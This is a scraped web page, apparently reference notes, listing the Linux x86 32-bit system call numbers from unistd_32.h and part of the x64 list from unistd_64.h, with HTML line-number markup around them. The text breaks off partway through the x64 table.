class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><code class="hljs plant">#ifndef _ASM_X86_UNISTD_32_H<br>#define _ASM_X86_UNISTD_32_H 1<br><br>#define __NR_restart_syscall 0<br>#define __NR_exit 1<br>#define __NR_fork 2<br>#define __NR_read 3<br>#define __NR_write 4<br>#define __NR_open 5<br>#define __NR_close 6<br>#define __NR_waitpid 7<br>#define __NR_creat 8<br>#define __NR_link 9<br>#define __NR_unlink 10<br>#define __NR_execve 11<br>#define __NR_chdir 12<br>#define __NR_time 13<br>#define __NR_mknod 14<br>#define __NR_chmod 15<br>#define __NR_lchown 16<br>#define __NR_break 17<br>#define __NR_oldstat 18<br>#define __NR_lseek 19<br>#define __NR_getpid 20<br>#define __NR_mount 21<br>#define __NR_umount 22<br>#define __NR_setuid 23<br>#define __NR_getuid 24<br>#define __NR_stime 25<br>#define __NR_ptrace 26<br>#define __NR_alarm 27<br>#define __NR_oldfstat 28<br>#define __NR_pause 29<br>#define __NR_utime 30<br>#define __NR_stty 31<br>#define __NR_gtty 32<br>#define __NR_access 33<br>#define __NR_nice 34<br>#define __NR_ftime 35<br>#define __NR_sync 36<br>#define __NR_kill 37<br>#define __NR_rename 38<br>#define __NR_mkdir 39<br>#define __NR_rmdir 40<br>#define __NR_dup 41<br>#define __NR_pipe 42<br>#define __NR_times 43<br>#define __NR_prof 44<br>#define __NR_brk 45<br>#define __NR_setgid 46<br>#define __NR_getgid 47<br>#define __NR_signal 48<br>#define __NR_geteuid 49<br>#define __NR_getegid 50<br>#define __NR_acct 51<br>#define __NR_umount2 52<br>#define __NR_lock 53<br>#define __NR_ioctl 54<br>#define __NR_fcntl 55<br>#define __NR_mpx 56<br>#define __NR_setpgid 57<br>#define __NR_ulimit 58<br>#define __NR_oldolduname 59<br>#define __NR_umask 60<br>#define __NR_chroot 61<br>#define __NR_ustat 62<br>#define __NR_dup2 63<br>#define __NR_getppid 64<br>#define __NR_getpgrp 65<br>#define __NR_setsid 66<br>#define __NR_sigaction 67<br>#define __NR_sgetmask 68<br>#define __NR_ssetmask 69<br>#define __NR_setreuid 70<br>#define __NR_setregid 71<br>#define __NR_sigsuspend 72<br>#define __NR_sigpending 73<br>#define __NR_sethostname 74<br>#define __NR_setrlimit 75<br>#define __NR_getrlimit 76<br>#define __NR_getrusage 77<br>#define __NR_gettimeofday 78<br>#define __NR_settimeofday 79<br>#define __NR_getgroups 80<br>#define __NR_setgroups 81<br>#define __NR_select 82<br>#define __NR_symlink 83<br>#define __NR_oldlstat 84<br>#define __NR_readlink 85<br>#define __NR_uselib 86<br>#define __NR_swapon 87<br>#define __NR_reboot 88<br>#define __NR_readdir 89<br>#define __NR_mmap 90<br>#define __NR_munmap 91<br>#define __NR_truncate 92<br>#define __NR_ftruncate 93<br>#define __NR_fchmod 94<br>#define __NR_fchown 95<br>#define __NR_getpriority 96<br>#define __NR_setpriority 97<br>#define __NR_profil 98<br>#define __NR_statfs 99<br>#define __NR_fstatfs 100<br>#define __NR_ioperm 101<br>#define __NR_socketcall 102<br>#define __NR_syslog 103<br>#define __NR_setitimer 104<br>#define __NR_getitimer 105<br>#define __NR_stat 106<br>#define __NR_lstat 107<br>#define __NR_fstat 108<br>#define __NR_olduname 109<br>#define __NR_iopl 110<br>#define __NR_vhangup 111<br>#define __NR_idle 112<br>#define __NR_vm86old 113<br>#define __NR_wait4 114<br>#define __NR_swapoff 115<br>#define __NR_sysinfo 116<br>#define __NR_ipc 117<br>#define __NR_fsync 118<br>#define __NR_sigreturn 119<br>#define __NR_clone 120<br>#define __NR_setdomainname 121<br>#define __NR_uname 122<br>#define __NR_modify_ldt 123<br>#define __NR_adjtimex 124<br>#define __NR_mprotect 125<br>#define __NR_sigprocmask 126<br>#define __NR_create_module 127<br>#define __NR_init_module 128<br>#define __NR_delete_module 129<br>#define __NR_get_kernel_syms 130<br>#define __NR_quotactl 131<br>#define __NR_getpgid 132<br>#define __NR_fchdir 133<br>#define __NR_bdflush 134<br>#define __NR_sysfs 135<br>#define __NR_personality 136<br>#define __NR_afs_syscall 137<br>#define __NR_setfsuid 138<br>#define __NR_setfsgid 139<br>#define __NR__llseek 140<br>#define __NR_getdents 141<br>#define __NR__newselect 142<br>#define __NR_flock 143<br>#define __NR_msync 144<br>#define __NR_readv 145<br>#define __NR_writev 146<br>#define __NR_getsid 147<br>#define __NR_fdatasync 148<br>#define __NR__sysctl 149<br>#define __NR_mlock 150<br>#define __NR_munlock 151<br>#define __NR_mlockall 152<br>#define __NR_munlockall 153<br>#define __NR_sched_setparam 154<br>#define __NR_sched_getparam 155<br>#define __NR_sched_setscheduler 156<br>#define __NR_sched_getscheduler 157<br>#define __NR_sched_yield 158<br>#define __NR_sched_get_priority_max 159<br>#define __NR_sched_get_priority_min 160<br>#define __NR_sched_rr_get_interval 161<br>#define __NR_nanosleep 162<br>#define __NR_mremap 163<br>#define __NR_setresuid 164<br>#define __NR_getresuid 165<br>#define __NR_vm86 166<br>#define __NR_query_module 167<br>#define __NR_poll 168<br>#define __NR_nfsservctl 169<br>#define __NR_setresgid 170<br>#define __NR_getresgid 171<br>#define __NR_prctl 172<br>#define __NR_rt_sigreturn 173<br>#define __NR_rt_sigaction 174<br>#define __NR_rt_sigprocmask 175<br>#define __NR_rt_sigpending 176<br>#define __NR_rt_sigtimedwait 177<br>#define __NR_rt_sigqueueinfo 178<br>#define __NR_rt_sigsuspend 179<br>#define __NR_pread64 180<br>#define __NR_pwrite64 181<br>#define __NR_chown 182<br>#define __NR_getcwd 183<br>#define __NR_capget 184<br>#define __NR_capset 185<br>#define __NR_sigaltstack 186<br>#define __NR_sendfile 187<br>#define __NR_getpmsg 188<br>#define __NR_putpmsg 189<br>#define __NR_vfork 190<br>#define __NR_ugetrlimit 191<br>#define __NR_mmap2 192<br>#define __NR_truncate64 193<br>#define __NR_ftruncate64 194<br>#define __NR_stat64 195<br>#define __NR_lstat64 196<br>#define __NR_fstat64 197<br>#define __NR_lchown32 198<br>#define __NR_getuid32 199<br>#define __NR_getgid32 200<br>#define __NR_geteuid32 201<br>#define __NR_getegid32 202<br>#define __NR_setreuid32 203<br>#define __NR_setregid32 204<br>#define __NR_getgroups32 205<br>#define __NR_setgroups32 206<br>#define __NR_fchown32 207<br>#define __NR_setresuid32 208<br>#define __NR_getresuid32 209<br>#define __NR_setresgid32 210<br>#define __NR_getresgid32 211<br>#define __NR_chown32 212<br>#define __NR_setuid32 213<br>#define __NR_setgid32 214<br>#define __NR_setfsuid32 215<br>#define __NR_setfsgid32 216<br>#define __NR_pivot_root 217<br>#define __NR_mincore 218<br>#define __NR_madvise 219<br>#define __NR_getdents64 220<br>#define __NR_fcntl64 221<br>#define __NR_gettid 224<br>#define __NR_readahead 225<br>#define __NR_setxattr 226<br>#define __NR_lsetxattr 227<br>#define __NR_fsetxattr 228<br>#define __NR_getxattr 229<br>#define __NR_lgetxattr 230<br>#define __NR_fgetxattr 231<br>#define __NR_listxattr 232<br>#define __NR_llistxattr 233<br>#define __NR_flistxattr 234<br>#define __NR_removexattr 235<br>#define __NR_lremovexattr 236<br>#define __NR_fremovexattr 237<br>#define __NR_tkill 238<br>#define __NR_sendfile64 239<br>#define __NR_futex 240<br>#define __NR_sched_setaffinity 241<br>#define __NR_sched_getaffinity 242<br>#define __NR_set_thread_area 243<br>#define __NR_get_thread_area 244<br>#define __NR_io_setup 245<br>#define __NR_io_destroy 246<br>#define __NR_io_getevents 247<br>#define __NR_io_submit 248<br>#define __NR_io_cancel 249<br>#define __NR_fadvise64 250<br>#define __NR_exit_group 252<br>#define __NR_lookup_dcookie 253<br>#define __NR_epoll_create 254<br>#define __NR_epoll_ctl 255<br>#define __NR_epoll_wait 256<br>#define __NR_remap_file_pages 257<br>#define __NR_set_tid_address 258<br>#define __NR_timer_create 259<br>#define __NR_timer_settime 260<br>#define __NR_timer_gettime 261<br>#define __NR_timer_getoverrun 262<br>#define __NR_timer_delete 263<br>#define __NR_clock_settime 264<br>#define __NR_clock_gettime 265<br>#define __NR_clock_getres 266<br>#define __NR_clock_nanosleep 267<br>#define __NR_statfs64 268<br>#define __NR_fstatfs64 269<br>#define __NR_tgkill 270<br>#define __NR_utimes 271<br>#define __NR_fadvise64_64 272<br>#define __NR_vserver 273<br>#define __NR_mbind 274<br>#define __NR_get_mempolicy 275<br>#define __NR_set_mempolicy 276<br>#define __NR_mq_open 277<br>#define __NR_mq_unlink 278<br>#define __NR_mq_timedsend 279<br>#define __NR_mq_timedreceive 280<br>#define __NR_mq_notify 281<br>#define __NR_mq_getsetattr 282<br>#define __NR_kexec_load 283<br>#define __NR_waitid 284<br>#define __NR_add_key 286<br>#define __NR_request_key 287<br>#define __NR_keyctl 288<br>#define __NR_ioprio_set 289<br>#define __NR_ioprio_get 290<br>#define __NR_inotify_init 291<br>#define __NR_inotify_add_watch 292<br>#define __NR_inotify_rm_watch 293<br>#define __NR_migrate_pages 294<br>#define __NR_openat 295<br>#define __NR_mkdirat 296<br>#define __NR_mknodat 297<br>#define __NR_fchownat 298<br>#define __NR_futimesat 299<br>#define __NR_fstatat64 300<br>#define __NR_unlinkat 301<br>#define __NR_renameat 302<br>#define __NR_linkat 303<br>#define __NR_symlinkat 304<br>#define __NR_readlinkat 305<br>#define __NR_fchmodat 306<br>#define __NR_faccessat 307<br>#define __NR_pselect6 308<br>#define __NR_ppoll 309<br>#define __NR_unshare 310<br>#define __NR_set_robust_list 311<br>#define __NR_get_robust_list 312<br>#define __NR_splice 313<br>#define __NR_sync_file_range 314<br>#define __NR_tee 315<br>#define __NR_vmsplice 316<br>#define __NR_move_pages 317<br>#define __NR_getcpu 318<br>#define __NR_epoll_pwait 319<br>#define __NR_utimensat 320<br>#define __NR_signalfd 321<br>#define __NR_timerfd_create 322<br>#define __NR_eventfd 323<br>#define __NR_fallocate 324<br>#define __NR_timerfd_settime 325<br>#define __NR_timerfd_gettime 326<br>#define __NR_signalfd4 327<br>#define __NR_eventfd2 328<br>#define __NR_epoll_create1 329<br>#define __NR_dup3 330<br>#define __NR_pipe2 331<br>#define __NR_inotify_init1 332<br>#define __NR_preadv 333<br>#define __NR_pwritev 334<br>#define __NR_rt_tgsigqueueinfo 335<br>#define __NR_perf_event_open 336<br>#define __NR_recvmmsg 337<br>#define __NR_fanotify_init 338<br>#define __NR_fanotify_mark 339<br>#define __NR_prlimit64 340<br>#define __NR_name_to_handle_at 341<br>#define __NR_open_by_handle_at 342<br>#define __NR_clock_adjtime 343<br>#define __NR_syncfs 344<br>#define __NR_sendmmsg 345<br>#define __NR_setns 346<br>#define __NR_process_vm_readv 347<br>#define __NR_process_vm_writev 348<br>#define __NR_kcmp 349<br>#define __NR_finit_module 350<br>#define __NR_sched_setattr 351<br>#define __NR_sched_getattr 352<br>#define __NR_renameat2 353<br>#define __NR_seccomp 354<br>#define __NR_getrandom 355<br>#define __NR_memfd_create 356<br>#define __NR_bpf 357<br>#define __NR_execveat 358<br>#define __NR_socket 359<br>#define __NR_socketpair 360<br>#define __NR_bind 361<br>#define __NR_connect 362<br>#define __NR_listen 363<br>#define __NR_accept4 364<br>#define __NR_getsockopt 365<br>#define __NR_setsockopt 366<br>#define __NR_getsockname 367<br>#define __NR_getpeername 368<br>#define __NR_sendto 369<br>#define __NR_sendmsg 370<br>#define __NR_recvfrom 371<br>#define __NR_recvmsg 372<br>#define __NR_shutdown 373<br>#define __NR_userfaultfd 374<br>#define __NR_membarrier 375<br>#define __NR_mlock2 376<br>#define __NR_copy_file_range 377<br>#define __NR_preadv2 378<br>#define __NR_pwritev2 379<br><br>#endif /* _ASM_X86_UNISTD_32_H */<br></code></pre></td></tr></table></figure><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><code class="hljs plant">#ifndef _ASM_X86_UNISTD_64_H<br>#define _ASM_X86_UNISTD_64_H 1<br><br>#define __NR_read 0<br>#define __NR_write 1<br>#define __NR_open 2<br>#define __NR_close 3<br>#define __NR_stat 4<br>#define __NR_fstat 5<br>#define __NR_lstat 6<br>#define __NR_poll 7<br>#define __NR_lseek 8<br>#define __NR_mmap 9<br>#define __NR_mprotect 10<br>#define __NR_munmap 11<br>#define __NR_brk 12<br>#define __NR_rt_sigaction 13<br>#define __NR_rt_sigprocmask 14<br>#define __NR_rt_sigreturn 15<br>#define __NR_ioctl 16<br>#define __NR_pread64 17<br>#define __NR_pwrite64 18<br>#define __NR_readv 19<br>#define __NR_writev 20<br>#define __NR_access 21<br>#define __NR_pipe 22<br>#define __NR_select 23<br>#define __NR_sched_yield 24<br>#define __NR_mremap 25<br>#define __NR_msync 26<br>#define __NR_mincore 27<br>#define __NR_madvise 28<br>#define __NR_shmget 29<br>#define __NR_shmat 30<br>#define __NR_shmctl 31<br>#define __NR_dup 32<br>#define __NR_dup2 33<br>#define __NR_pause 34<br>#define __NR_nanosleep 35<br>#define __NR_getitimer 36<br>#define __NR_alarm 37<br>#define __NR_setitimer 38<br>#define __NR_getpid 39<br>#define __NR_sendfile 40<br>#define __NR_socket 41<br>#define __NR_connect 42<br>#define __NR_accept 43<br>#define __NR_sendto 44<br>#define __NR_recvfrom 45<br>#define __NR_sendmsg 46<br>#define __NR_recvmsg 47<br>#define __NR_shutdown 48<br>#define __NR_bind 49<br>#define __NR_listen 50<br>#define __NR_getsockname 51<br>#define __NR_getpeername 52<br>#define __NR_socketpair 53<br>#define __NR_setsockopt 54<br>#define __NR_getsockopt 55<br>#define __NR_clone 56<br>#define __NR_fork 57<br>#define __NR_vfork 58<br>#define __NR_execve 59<br>#define __NR_exit 60<br>#define __NR_wait4 61<br>#define __NR_kill 62<br>#define __NR_uname 63<br>#define __NR_semget 64<br>#define __NR_semop 65<br>#define __NR_semctl 66<br>#define __NR_shmdt 67<br>#define __NR_msgget 68<br>#define __NR_msgsnd 69<br>#define __NR_msgrcv 70<br>#define __NR_msgctl 71<br>#define __NR_fcntl 72<br>#define __NR_flock 73<br>#define __NR_fsync 74<br>#define __NR_fdatasync 75<br>#define __NR_truncate 76<br>#define __NR_ftruncate 77<br>#define __NR_getdents 78<br>#define __NR_getcwd 79<br>#define __NR_chdir 80<br>#define __NR_fchdir 81<br>#define __NR_rename 82<br>#define __NR_mkdir 83<br>#define __NR_rmdir 84<br>#define __NR_creat 85<br>#define __NR_link 86<br>#define __NR_unlink 87<br>#define __NR_symlink 88<br>#define __NR_readlink 89<br>#define __NR_chmod 90<br>#define __NR_fchmod 91<br>#define __NR_chown 92<br>#define __NR_fchown 93<br>#define __NR_lchown 94<br>#define __NR_umask 95<br>#define __NR_gettimeofday 96<br>#define __NR_getrlimit 97<br>#define __NR_getrusage 98<br>#define __NR_sysinfo 99<br>#define __NR_times 100<br>#define __NR_ptrace 101<br>#define __NR_getuid 102<br>#define __NR_syslog 103<br>#define __NR_getgid 104<br>#define __NR_setuid 105<br>#define __NR_setgid 106<br>#define __NR_geteuid 107<br>#define __NR_getegid 108<br>#define __NR_setpgid 109<br>#define __NR_getppid 110<br>#define __NR_getpgrp 111<br>#define __NR_setsid 112<br>#define __NR_setreuid 113<br>#define __NR_setregid 114<br>#define __NR_getgroups 115<br>#define __NR_setgroups 116<br>#define __NR_setresuid 117<br>#define __NR_getresuid 118<br>#define __NR_setresgid 119<br>#define __NR_getresgid 120<br>#define __NR_getpgid 121<br>#define __NR_setfsuid 122<br>#define __NR_setfsgid 123<br>#define __NR_getsid 124<br>#define __NR_capget 125<br>#define __NR_capset 126<br>#define __NR_rt_sigpending 127<br>#define __NR_rt_sigtimedwait 128<br>#define __NR_rt_sigqueueinfo 129<br>#define __NR_rt_sigsuspend 130<br>#define __NR_sigaltstack 131<br>#define __NR_utime 132<br>#define __NR_mknod 133<br>#define __NR_uselib 134<br>#define __NR_personality 135<br>#define __NR_ustat 136<br>#define __NR_statfs 137<br>#define __NR_fstatfs 138<br>#define __NR_sysfs 139<br>#define __NR_getpriority 140<br>#define __NR_setpriority 141<br>#define __NR_sched_setparam 142<br>#define __NR_sched_getparam 143<br>#define __NR_sched_setscheduler 144<br>#define __NR_sched_getscheduler 145<br>#define __NR_sched_get_priority_max 146<br>#define __NR_sched_get_priority_min 147<br>#define __NR_sched_rr_get_interval 148<br>#define __NR_mlock 149<br>#define __NR_munlock 150<br>#define __NR_mlockall 151<br>#define __NR_munlockall 152<br>#define __NR_vhangup 153<br>#define __NR_modify_ldt 154<br>#define __NR_pivot_root 155<br>#define __NR__sysctl 156<br>#define __NR_prctl 157<br>#define __NR_arch_prctl 158<br>#define __NR_adjtimex 159<br>#define __NR_setrlimit 160<br>#define __NR_chroot 161<br>#define __NR_sync 162<br>#define __NR_acct 163<br>#define __NR_settimeofday 164<br>#define __NR_mount 165<br>#define __NR_umount2 166<br>#define __NR_swapon 167<br>#define __NR_swapoff 168<br>#define __NR_reboot 169<br>#define __NR_sethostname 170<br>#define __NR_setdomainname 171<br>#define __NR_iopl 172<br>#define __NR_ioperm 173<br>#define __NR_create_module 174<br>#define __NR_init_module 175<br>#define __NR_delete_module 176<br>#define __NR_get_kernel_syms 177<br>#define __NR_query_module 178<br>#define __NR_quotactl 179<br>#define __NR_nfsservctl 180<br>#define __NR_getpmsg 181<br>#define __NR_putpmsg 182<br>#define __NR_afs_syscall 183<br>#define __NR_tuxcall 184<br>#define __NR_security 185<br>#define __NR_gettid 186<br>#define __NR_readahead 187<br>#define __NR_setxattr 188<br>#define __NR_lsetxattr 189<br>#define __NR_fsetxattr 190<br>#define __NR_getxattr 191<br>#define __NR_lgetxattr 192<br>#define __NR_fgetxattr 193<br>#define __NR_listxattr 194<br>#define __NR_llistxattr 195<br>#define __NR_flistxattr 196<br>#define __NR_removexattr 197<br>#define __NR_lremovexattr 198<br>#define __NR_fremovexattr 199<br>#define __NR_tkill 200<br>#define __NR_time 201<br>#define __NR_futex 202<br>#define __NR_sched_setaffinity 